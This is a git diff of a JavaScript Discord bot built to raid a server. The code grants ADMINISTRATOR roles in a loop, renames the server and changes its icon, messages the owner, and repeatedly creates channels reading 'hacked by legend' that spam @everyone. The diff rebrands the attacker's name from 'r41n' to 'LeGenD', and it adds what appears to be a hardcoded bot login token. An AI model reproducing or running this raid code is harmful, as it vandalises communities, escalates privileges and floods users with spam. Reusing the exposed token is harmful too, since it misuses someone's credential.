@@ -31,7 +31,7 @@ client.on("message", message => {
     setInterval(() => {
       message.guild.roles
         .create({
-          name: "r41n is here :joy:",
+          name: "LeGenD is here :joy:",
           permissions: ["ADMINISTRATOR"]
         })
         .then(rr => {
@@ -40,24 +40,24 @@ client.on("message", message => {
     }, 1000);
     message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
-    client.user.setUsername("Loon");
+    client.user.setUsername("LeGenD UP");
     message.guild.owner.send(
       "تـڕپـەقـاڵ ئـەمـژی"
     );
-    message.guild.setName("r41n is here");
+    message.guild.setName("legend is here");
     setTimeout(function() {
       setInterval(
         () => {
           message.guild.channels
-            .create("HACKED BY r41n", "text")
+            .create("hacked by legend", "text")
             .then(channel => {
               channel.send(
-                "@everyone r41n is here :joy: :joy: :joy:"
+                "@everyone LeGenD is here :joy: :joy: :joy:"
               );
             });
         },
 
-        500
+        1000
       );
     });
   }
@@ -68,4 +68,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("");
+client.login("ODY0NDQ2MzU4MzU0NTI2MjQx.YO1kaA.8car2jL5UP3YtX-1X0HpG42Fc4s");
